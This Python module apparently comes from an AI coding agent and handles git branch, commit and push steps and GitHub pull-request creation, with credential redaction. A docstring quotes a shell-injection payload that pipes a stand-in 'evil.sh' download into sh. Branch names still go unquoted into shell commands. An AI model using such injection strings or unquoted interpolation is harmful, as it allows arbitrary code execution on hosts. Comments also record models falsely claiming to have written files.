# apps/api/app/agents/github_tools.py
"""Branch/commit/push/PR — the graph's final node, run after review passes."""

import re
import shlex
from pathlib import Path
from urllib.parse import urlparse

import httpx

from app.services.github_api import GITHUB_API, github_headers
from app.tools.terminal import run_command


def create_branch(workspace_root: Path, branch_name: str) -> str:
    result = run_command(
        f"git checkout -b {branch_name}", workspace_root=workspace_root
    )
    if not result.startswith("Exit Code: 0"):
        raise RuntimeError(f"git checkout -b {branch_name} failed:\n{result}")
    return result


def _stdout_of(run_command_result: str) -> str:
    """`run_command`'s return value is one formatted blob —
    `"Exit Code: N\\nSTDOUT:\\n<stdout>\\nSTDERR:\\n<stderr>"`, sections
    only present if non-empty. Pull just the stdout back out.

    (Previously done as `result.split("Exit Code: 0")[-1].strip()`, which
    left a literal `"STDOUT:\\n"` prefix — including its embedded newline
    — stuck on the front of the value. That silently broke every git push
    this was used for: the newline split what should've been one `git
    push <url> <branch>` shell command into two garbage ones, so the push
    never reached GitHub, and nothing here checked for that — the graph
    would sail on into opening a PR against a branch that was never
    actually pushed, surfacing many steps later as a GitHub-side 422.)
    """
    if "STDOUT:\n" not in run_command_result:
        return ""
    after = run_command_result.split("STDOUT:\n", 1)[1]
    return after.split("\nSTDERR:", 1)[0].strip()


_TOKEN_IN_URL_RE = re.compile(r"(x-access-token:)[^@\s]+(@)")


def _redact(text: str) -> str:
    """Scrubs any embedded `x-access-token:<token>@` credential out of raw
    git/command output before it's surfaced in a `RuntimeError` — which
    ends up in `AgentRun.error`, shown straight in the UI. A plain
    `.replace(token, '***')` (what this used to be) only catches *this*
    call's own token; `git remote get-url origin`'s output carries
    whatever token the repo was originally *cloned* with, which can be a
    different (older, possibly still-valid) one — that needs redacting
    too, and a literal-string replace can't do it without already knowing
    that value."""
    return _TOKEN_IN_URL_RE.sub(r"\1***\2", text)


def _strip_credentials(url: str) -> str:
    """`git remote get-url origin` returns whatever URL the repo was
    actually cloned with — and `clone_repository` clones using a URL that
    already has `x-access-token:<token>@` embedded in it (that's how it
    authenticates a private-repo clone). Blindly prepending a *fresh*
    credential onto that (previous bug, confirmed while diagnosing this)
    produces a doubly-credentialed URL —
    `https://x-access-token:NEW@x-access-token:OLD@github.com/...` — that
    git/curl rejects outright: "URL rejected: Port number was not a
    decimal number between 0 and 65535" (it isn't actually a port at all;
    that's just where curl's parser lands once the extra `@` has thrown
    off which part is host). Strip any embedded userinfo first so a fresh
    token always lands on a clean `scheme://host[:port]/path` URL,
    regardless of whether the remote already had credentials in it."""
    parsed = urlparse(url)
    netloc = parsed.hostname or ""
    if parsed.port:
        netloc += f":{parsed.port}"
    return parsed._replace(netloc=netloc).geturl()


def commit_and_push(
    workspace_root: Path, branch_name: str, message: str, token: str, base_branch: str
) -> str:
    """Commits all changes and pushes, injecting the token into the push URL
    for this call only (never persisted into the repo's git config).

    `message` is attacker-reachable free text (the run's `task`, which can
    come straight from a GitHub issue body on the connected repo) — it
    goes through `shlex.quote` before ever touching a shell command line.
    (Previously interpolated into a hand-written `"..."`-quoted string
    passed to `shell=True` — a task like `foo" && curl evil.sh | sh && echo
    "` broke out of the quotes and ran arbitrary shell commands on the API
    host. Found and fixed while auditing this module.)

    Raises `RuntimeError` if any step didn't actually succeed, rather than
    continuing on to a PR-creation step doomed to fail — `run_command`
    itself never raises on a non-zero exit code, so this is the only place
    that will."""
    run_command("git add -A", workspace_root=workspace_root)

    # Whether there's anything to commit is checked via `--porcelain`
    # (machine-readable, locale-independent) rather than string-matching
    # git commit's English "nothing to commit, working tree clean" output
    # — which breaks silently on a non-English `LANG`/`LC_ALL`, wrongly
    # treating a real commit failure as "already committed" or vice versa.
    status_result = run_command("git status --porcelain", workspace_root=workspace_root)
    working_tree_clean = _stdout_of(status_result) == ""

    commit_result = "(nothing to commit — working tree already clean)"
    if not working_tree_clean:
        commit_result = run_command(
            "git -c user.email=agent@ai-swe.local -c user.name='AI Software Engineer' "
            f"commit -m {shlex.quote(message)}",
            workspace_root=workspace_root,
        )
        if not commit_result.startswith("Exit Code: 0"):
            raise RuntimeError(f"git commit failed:\n{_redact(commit_result)}")

    # Whether this call made a fresh commit above, or the working tree was
    # already clean (e.g. an earlier, since-retried attempt already
    # committed everything onto whatever branch this one just checked out
    # from — it got past `commit` but failed at `push`), there must be at
    # least one commit not already on the base branch, or there's nothing
    # to open a PR for. Confirmed cause of a real 422 while diagnosing
    # this: a local model that narrated writing a file without ever
    # actually calling the write tool, so the working tree was clean from
    # the very start and this would otherwise have sailed through to a
    # push + PR attempt doomed to fail several steps later, cryptically.
    ahead_result = run_command(
        f"git rev-list --count {base_branch}..HEAD", workspace_root=workspace_root
    )
    if not ahead_result.startswith("Exit Code: 0"):
        raise RuntimeError(
            f"Could not determine commits ahead of '{base_branch}':\n"
            f"{_redact(ahead_result)}"
        )
    if _stdout_of(ahead_result) == "0":
        raise RuntimeError(
            "No changes to commit — this branch has no commits ahead of "
            f"'{base_branch}'. The coder made no actual file changes this "
            "run (or its changes exactly matched what was already there), "
            "so there's nothing to open a pull request for. This is a "
            "known failure mode of some local models (they narrate writing "
            "a file without actually calling the write tool) — retrying "
            "just this step won't help since the coder doesn't run again; "
            "start a fresh run instead, ideally with 'Skip tests' off and/or "
            "a different model, so a real failed write gets caught earlier."
        )

    remote_result = run_command(
        "git remote get-url origin", workspace_root=workspace_root
    )
    origin_url = _stdout_of(remote_result)
    if not origin_url:
        raise RuntimeError(f"Could not determine origin URL:\n{_redact(remote_result)}")
    origin_url = _strip_credentials(origin_url)

    auth_url = origin_url.replace("https://", f"https://x-access-token:{token}@")
    push_result = run_command(
        f"git push {auth_url} {branch_name}", workspace_root=workspace_root
    )
    if not push_result.startswith("Exit Code: 0"):
        raise RuntimeError(f"git push failed:\n{_redact(push_result)}")

    return f"{commit_result}\n{_redact(push_result)}"


async def create_pull_request(
    token: str,
    owner: str,
    repo: str,
    head_branch: str,
    base_branch: str,
    title: str,
    body: str,
) -> str:
    async with httpx.AsyncClient(timeout=15.0) as client:
        response = await client.post(
            f"{GITHUB_API}/repos/{owner}/{repo}/pulls",
            headers=github_headers(token),
            json={
                "title": title,
                "head": head_branch,
                "base": base_branch,
                "body": body,
            },
        )
        response.raise_for_status()
        return response.json()["html_url"]
